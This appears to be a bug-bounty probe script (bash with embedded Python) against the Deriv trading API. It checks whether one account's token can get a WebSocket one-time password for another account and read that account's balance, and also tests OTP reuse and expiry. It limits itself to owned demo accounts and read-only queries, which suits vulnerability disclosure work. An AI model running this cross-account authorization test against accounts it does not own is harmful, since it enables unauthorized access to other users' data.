#!/usr/bin/env bash
# DerivWS OTP account-binding evidence probe v7 (v6 + 3 fixes, see FIX v7 tags); both DEMO accounts must be yours.
# No trading. No token/OTP value printed. No live requests until TOKEN_A is supplied.
# Set TOKEN_A_FILE=/secure/path/pat-a and optionally TOKEN_B_FILE=/secure/path/pat-b;
# otherwise PAT A is read silently from the terminal. Do NOT use bash -x.
# Example: TOKEN_A_FILE="$HOME/.private/deriv-a" TOKEN_B_FILE="$HOME/.private/deriv-b" bash deriv_otp_v6.sh
set +x
set -u
umask 077

APP_ID="${APP_ID:-351cACc69MswSWTa35GxM}" # Verify registered PAT App ID; override via APP_ID env.
APP_ID_B="${APP_ID_B:-$APP_ID}"      # Optional second app ID for B ownership proof.
OWN_DEMO_ID='DOT95245471'
FOREIGN='DOT95235117'
AUTH_MODE='pat'                # pat or oauth; Deriv-App-ID is REQUIRED for PAT.
CONFIRM_BINDING="${CONFIRM_BINDING:-0}"  # 1 permits a single read-only foreign balance query.
RUN_EXPIRY="${RUN_EXPIRY:-0}"            # 1 waits 125 seconds for OTP expiry check.
BASE='https://api.derivws.com/trading/v1/options'

WORK="$(mktemp -d)" || exit 1
cleanup() { find "$WORK" -maxdepth 1 -type f -exec sh -c 'for f do shred -u "$f" 2>/dev/null || rm -f "$f"; done' sh {} +; rmdir "$WORK" 2>/dev/null || :; }
trap cleanup EXIT
fail() { printf 'STOP: %s\n' "$1" >&2; exit "${2:-1}"; }
command -v python3 >/dev/null || fail 'python3 required'
command -v curl >/dev/null || fail 'curl required'
[[ "$AUTH_MODE" == pat || "$AUTH_MODE" == oauth ]] || fail 'AUTH_MODE must be pat or oauth'
[[ "$CONFIRM_BINDING" == 0 || "$CONFIRM_BINDING" == 1 ]] || fail 'CONFIRM_BINDING must be 0 or 1'
[[ "$RUN_EXPIRY" == 0 || "$RUN_EXPIRY" == 1 ]] || fail 'RUN_EXPIRY must be 0 or 1'
[[ "$OWN_DEMO_ID" =~ ^[A-Za-z0-9]+$ && "$FOREIGN" =~ ^[A-Za-z0-9]+$ ]] || fail 'Invalid account id format'
[[ "$OWN_DEMO_ID" != "$FOREIGN" ]] || fail 'Own and foreign IDs must differ'

load_token_file() {
  local input_file="${1:-}" output="$2" name="$3" token
  if [[ -n "$input_file" ]]; then
    [[ -r "$input_file" && -f "$input_file" ]] || fail "$name token file unavailable"
    cp -- "$input_file" "$output" || fail "Unable to read $name token file"
  else
    [[ "$name" == A ]] || return 1
    [[ -r /dev/tty ]] || fail 'Use TOKEN_A_FILE when there is no interactive terminal'
    printf 'Enter PAT A (hidden; never paste into chat): ' >/dev/tty
    IFS= read -r -s token </dev/tty || fail 'Could not read token A'
    printf '\n' >/dev/tty
    printf '%s' "$token" > "$output"
    unset token
  fi
  chmod 600 "$output"
}

make_auth_cfg() {
  python3 - "$1" "$2" "$AUTH_MODE" "${3:-$APP_ID}" <<'PY'
import sys
from pathlib import Path
src,dst,mode,app_id=sys.argv[1:]
try: token=Path(src).read_text(encoding='ascii').strip('\r\n')
except Exception: raise SystemExit('STOP: token is not plain ASCII')
if not token or any(ord(c)<33 or ord(c)>126 for c in token) or '***' in token:
    raise SystemExit('STOP: token empty, masked, or contains control/space characters')
def quote(v): return v.replace('\\','\\\\').replace('"','\\"')
lines=['header = "Authorization: Bearer '+quote(token)+'"']
if mode=='pat':
    if not app_id: raise SystemExit('STOP: PAT requires an App ID')
    lines.append('header = "Deriv-App-ID: '+quote(app_id)+'"')
Path(dst).write_text('\n'.join(lines)+'\n',encoding='ascii')
Path(dst).chmod(0o600)
PY
}

api() {
  local method="$1" path="$2" out="$3" cfg="$4" status
  status=$(curl --silent --show-error --max-time 20 --proto '=https' \
    --config "$cfg" --request "$method" --output "$out" --write-out '%{http_code}' \
    --header 'X-HackerOne-Research: marcil78' --user-agent 'marcil78-h1-research' \
    --header 'Accept: application/json' "$BASE/$path") || fail "Transport error calling $path (no verdict)" 30
  printf '%s' "$status"
}

# Verify account lists with exact data shape. Never infer B ownership merely because absent from A.
check_accounts() {
  python3 - "$1" "$2" "$OWN_DEMO_ID" "$FOREIGN" <<'PY'
import json,sys
src,who,own,foreign=sys.argv[1:]
try: d=json.load(open(src,encoding='utf-8'))
except Exception: raise SystemExit('STOP: account list is not JSON')
rows=d.get('data') if isinstance(d,dict) else None
if not isinstance(rows,list): raise SystemExit('STOP: account list data is not an array')
accounts={a.get('account_id'):a for a in rows if isinstance(a,dict)}
if who=='A':
    if own not in accounts or accounts[own].get('account_type')!='demo':
        raise SystemExit('STOP: A does not own specified DEMO account')
    if foreign in accounts: raise SystemExit('STOP: B is listed under A token')
    print('A listing: own DEMO confirmed, B absent')
else:
    if foreign not in accounts or accounts[foreign].get('account_type')!='demo':
        raise SystemExit('STOP: B token does not own specified DEMO account')
    if own in accounts: raise SystemExit('STOP: A account also found in B list; not independent')
    print('B listing: foreign DEMO confirmed, A absent')
PY
}

# Require actual wss:// URL, exactly the API host and demo channel, with one non-empty OTP.
parse_otp_url() {
  python3 - "$1" "$2" <<'PY'
import json,sys,urllib.parse
from pathlib import Path
try: data=json.loads(Path(sys.argv[1]).read_text())
except Exception: raise SystemExit('STOP: OTP 200 response is not JSON')
url=data.get('data',{}).get('url') if isinstance(data,dict) and isinstance(data.get('data'),dict) else None
if not isinstance(url,str): raise SystemExit('STOP: OTP 200 response lacks data.url (not proof of issuance)')
try: p=urllib.parse.urlsplit(url)
except ValueError: raise SystemExit('STOP: malformed websocket URL')
q=urllib.parse.parse_qs(p.query,keep_blank_values=True)
if p.scheme!='wss' or p.hostname!='api.derivws.com' or p.port not in (None,443) or p.username or p.password or p.fragment:
    raise SystemExit('STOP: unexpected websocket destination')
if p.path!='/trading/v1/options/ws/demo' or len(q.get('otp',[]))!=1 or not q['otp'][0]:
    raise SystemExit('STOP: unexpected channel or missing/duplicate OTP')
Path(sys.argv[2]).write_text(url)
Path(sys.argv[2]).chmod(0o600)
print('OTP URL: validated wss host, demo channel, non-empty OTP (value hidden)')
PY
}

WS="$WORK/ws_probe.py"
cat > "$WS" <<'PY'
import base64,hashlib,json,os,socket,ssl,struct,sys,urllib.parse
from pathlib import Path
url=Path(sys.argv[1]).read_text()
query_balance=len(sys.argv)>2 and sys.argv[2]=='1'
p=urllib.parse.urlsplit(url)
result={'handshake':None,'verified_upgrade':False,'balance_account':None,'balance_ok':False}
s=None
try:
    if p.scheme!='wss' or p.hostname!='api.derivws.com' or p.path!='/trading/v1/options/ws/demo':
        raise ValueError('unexpected WebSocket URL destination')
    raw=socket.create_connection((p.hostname,p.port or 443),timeout=12)
    s=ssl.create_default_context().wrap_socket(raw,server_hostname=p.hostname)
    s.settimeout(12)
    key=base64.b64encode(os.urandom(16)).decode('ascii')
    suffix=p.path+('?' + p.query if p.query else '')
    request=(f'GET {suffix} HTTP/1.1\r\nHost: {p.hostname}\r\n'
             'Upgrade: websocket\r\nConnection: Upgrade\r\n'
             f'Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n'
             'User-Agent: marcil78-h1-research\r\nX-HackerOne-Research: marcil78\r\n\r\n')
    s.sendall(request.encode('ascii'))
    buf=b''
    while b'\r\n\r\n' not in buf:
        chunk=s.recv(4096)
        if not chunk: raise EOFError('upgrade response closed')
        buf+=chunk
        if len(buf)>65536: raise ValueError('HTTP response headers too large')
    head,buf=buf.split(b'\r\n\r\n',1)
    lines=head.decode('iso-8859-1').split('\r\n')
    parts=lines[0].split()
    result['handshake']=int(parts[1]) if len(parts)>=2 else None
    headers={}
    for line in lines[1:]:
        if ':' in line:
            k,v=line.split(':',1);headers[k.lower()]=v.strip()
    expected=base64.b64encode(hashlib.sha1((key+'258EAFA5-E914-47DA-95CA-C5AB0DC85B11').encode()).digest()).decode()
    result['verified_upgrade']=(result['handshake']==101 and
        headers.get('sec-websocket-accept')==expected and
        headers.get('upgrade','').lower()=='websocket')
    if not result['verified_upgrade'] or not query_balance: raise StopIteration
    payload=json.dumps({'balance':1,'req_id':1},separators=(',',':')).encode()
    mask=os.urandom(4)
    n=len(payload)
    prefix=bytes([0x81,0x80|n]) if n<126 else bytes([0x81,0x80|126])+struct.pack('!H',n)
    s.sendall(prefix+mask+bytes(b^mask[i%4] for i,b in enumerate(payload)))
    def read_exact(n):
        global buf
        while len(buf)<n:
            chunk=s.recv(65536)
            if not chunk: raise EOFError('WebSocket closed before balance response')
            buf+=chunk
        out,buf=buf[:n],buf[n:]
        return out
    for _ in range(20):
        b1,b2=read_exact(2)
        opcode=b1&15
        if b2&128: raise ValueError('server returned masked WS frame')
        n=b2&127
        if n==126:n=struct.unpack('!H',read_exact(2))[0]
        elif n==127:n=struct.unpack('!Q',read_exact(8))[0]
        if n>1024*1024: raise ValueError('WS frame exceeds cap')
        body=read_exact(n)
        if opcode==8: result['closed']=True;break
        if opcode not in (1,2):continue
        try: msg=json.loads(body)
        except (UnicodeDecodeError,ValueError):continue
        if not isinstance(msg,dict) or msg.get('req_id') not in (None,1):continue
        result['reply_keys']=sorted(msg.keys())  # FIX v7: names only, no values
        if 'error' in msg:
            e=msg['error']; result['api_error']=(e.get('code','unknown') if isinstance(e,dict) else 'unknown');break
        balance=msg.get('balance')
        if isinstance(balance,dict) and msg.get('msg_type') in (None,'balance'):
            result['balance_ok']=True
            result['balance_keys']=sorted(balance.keys())  # FIX v7: names only
            result['balance_account']=balance.get('loginid') or balance.get('account_id')
            break
except StopIteration:
    pass
except Exception as exc:
    result['exception']=type(exc).__name__
finally:
    if s:
        try:s.close()
        except Exception:pass
print(json.dumps(result,sort_keys=True))
PY
chmod 600 "$WS"

# Prepare secret files; secret itself never occurs in argv or printed output.
load_token_file "${TOKEN_A_FILE:-}" "$WORK/token_a" A
make_auth_cfg "$WORK/token_a" "$WORK/auth_a.cfg" || fail 'PAT A config invalid'
HAVE_B=0
if [[ -n "${TOKEN_B_FILE:-}" ]]; then
  load_token_file "$TOKEN_B_FILE" "$WORK/token_b" B
  make_auth_cfg "$WORK/token_b" "$WORK/auth_b.cfg" "$APP_ID_B" || fail 'PAT B config invalid'
  HAVE_B=1
fi

printf '=== DerivWS OTP v7; A=%s B=%s; independent B proof=%s ===\n' "$OWN_DEMO_ID" "$FOREIGN" "$HAVE_B"
A_STATUS=$(api GET 'accounts' "$WORK/accounts_a.json" "$WORK/auth_a.cfg") || exit $?  # FIX v7: transport error is not an auth verdict
printf 'A accounts HTTP %s\n' "$A_STATUS"
[[ "$A_STATUS" == 200 ]] || fail 'A token invalid/missing scope/App ID; no ownership verdict' 2
check_accounts "$WORK/accounts_a.json" A || fail 'A account control invalid' 3
if [[ "$HAVE_B" == 1 ]]; then
  B_STATUS=$(api GET 'accounts' "$WORK/accounts_b.json" "$WORK/auth_b.cfg") || exit $?  # FIX v7: transport error is not an auth verdict
  printf 'B accounts HTTP %s\n' "$B_STATUS"
  [[ "$B_STATUS" == 200 ]] || fail 'B proof failed; cannot establish independent ownership' 4
  check_accounts "$WORK/accounts_b.json" B || fail 'B account ownership proof failed' 4
else
  echo 'NOTE: B ownership is USER-ASSERTED only, not independently checked by this run.'
fi

CTRL=$(api POST "accounts/$OWN_DEMO_ID/otp" "$WORK/own.json" "$WORK/auth_a.cfg") || exit $?  # FIX v7: transport error is not an auth verdict
printf 'OWN OTP HTTP %s\n' "$CTRL"
[[ "$CTRL" == 200 ]] || fail 'Own OTP control failed; B test not meaningful' 5
parse_otp_url "$WORK/own.json" "$WORK/own.url" || fail 'Own OTP issuance control invalid' 5
OWN_WS=$(python3 "$WS" "$WORK/own.url" 1)
printf 'OWN ws balance: %s\n' "$OWN_WS"
# FIX v7: a balance reply without an account id no longer aborts the issuance test.
ID_CTRL=$(python3 - "$OWN_WS" "$OWN_DEMO_ID" <<'PY'
import json,sys
r=json.loads(sys.argv[1]); expected=sys.argv[2].upper()
if not (r.get('verified_upgrade') is True and r.get('balance_ok') is True): print('FAIL')
elif (r.get('balance_account') or '').upper()==expected: print('OK')
elif not r.get('balance_account'): print('NOID')
else: print('MISMATCH')
PY
)
case "$ID_CTRL" in
  OK)   echo 'CONTROL: own WS session identity = A (binding test is meaningful)' ;;
  NOID) echo 'WARN: own balance reply has no account id (see balance_keys); issuance test continues, binding verdict will be UNPROVABLE' ;;
  *)    fail "Own WS+balance positive control failed ($ID_CTRL); stopping" 6 ;;
esac
REUSE=$(python3 "$WS" "$WORK/own.url" 1)
printf 'REUSE own OTP: %s\n' "$REUSE"
python3 - "$REUSE" <<'PY'
import json,sys
r=json.loads(sys.argv[1])
if r.get('verified_upgrade') and r.get('balance_ok'):
    print('ANOMALY: second connection with same OTP returned authenticated balance')
elif r.get('verified_upgrade'):
    print('INCONCLUSIVE: second HTTP upgrade succeeded but authenticated balance not confirmed')
else:print('CONTROL: reused OTP did not complete verified WebSocket upgrade')
PY

# Foreigner B: request belongs to a different owned-by-researcher registration.
FOREIGN_STATUS=$(api POST "accounts/$FOREIGN/otp" "$WORK/foreign.json" "$WORK/auth_a.cfg") || exit $?  # FIX v7: transport error is not an auth verdict
printf 'B OTP with TOKEN A HTTP %s\n' "$FOREIGN_STATUS"
case "$FOREIGN_STATUS" in
  401|403|404) echo 'REJECTED: tested A-token/B-account issuance path did not cross authorization' ;;
  200)
    parse_otp_url "$WORK/foreign.json" "$WORK/foreign.url" || fail '200 without valid OTP URL; NOT issuance proof' 7
    echo 'ISSUANCE ANOMALY: TOKEN A received a syntactically valid OTP URL for B account.'
    if [[ "$HAVE_B" != 1 ]]; then echo 'LIMITATION: independent B ownership not automatically verified.'; fi
    if [[ "$CONFIRM_BINDING" == 1 ]]; then
      echo 'CONFIRM_BINDING=1: opening B once and sending ONE read-only balance query.'
      WSB=$(python3 "$WS" "$WORK/foreign.url" 1)
      printf 'B WS balance result: %s\n' "$WSB"
      python3 - "$WSB" "$FOREIGN" "$OWN_DEMO_ID" "$HAVE_B" "$ID_CTRL" <<'PY'
import json,sys
r=json.loads(sys.argv[1]);b=sys.argv[2].upper();a=sys.argv[3].upper();proof=sys.argv[4]=='1';idc=sys.argv[5]
if idc!='OK' and r.get('verified_upgrade'):
    print('VERDICT: WS opened with B OTP but balance exposes no account id -> binding UNPROVABLE with this probe')
elif not r.get('verified_upgrade'):
    print('VERDICT: issuance anomaly only; no successful WS upgrade')
elif not r.get('balance_ok'):
    print('VERDICT: WS upgraded but account authorization/identity not confirmed')
else:
    ident=(r.get('balance_account') or '').upper()
    if ident==b:
        print('VERDICT: CROSS-ACCOUNT READ OBSERVED' if proof else 'VERDICT: B ACCOUNT DATA OBSERVED, independent B ownership unverified')
    elif ident==a:print('VERDICT: connected to A, not B')
    else:print('VERDICT: balance returned, account identity missing or unexpected')
PY
    else
      echo 'VERDICT: issuance anomaly ONLY; actual WS account-binding untested (CONFIRM_BINDING=0).'
    fi
    ;;
  *) echo 'INCONCLUSIVE: unexpected HTTP code; do not infer authorization bypass' ;;
esac

if [[ "$RUN_EXPIRY" == 1 ]]; then
  E=$(api POST "accounts/$OWN_DEMO_ID/otp" "$WORK/expiry.json" "$WORK/auth_a.cfg") || exit $?  # FIX v7: transport error is not an auth verdict
  if [[ "$E" == 200 ]]; then
    parse_otp_url "$WORK/expiry.json" "$WORK/expiry.url" || fail 'Expiry control malformed'
    echo 'Waiting 125 seconds before expiry check...'
    sleep 125
    EXP=$(python3 "$WS" "$WORK/expiry.url" 1)
    printf 'EXPIRED ws result: %s\n' "$EXP"
  else echo "Expiry control skipped (HTTP $E)"; fi
fi
printf '%s\n' 'END: no token, OTP, or full WebSocket URL was printed.'
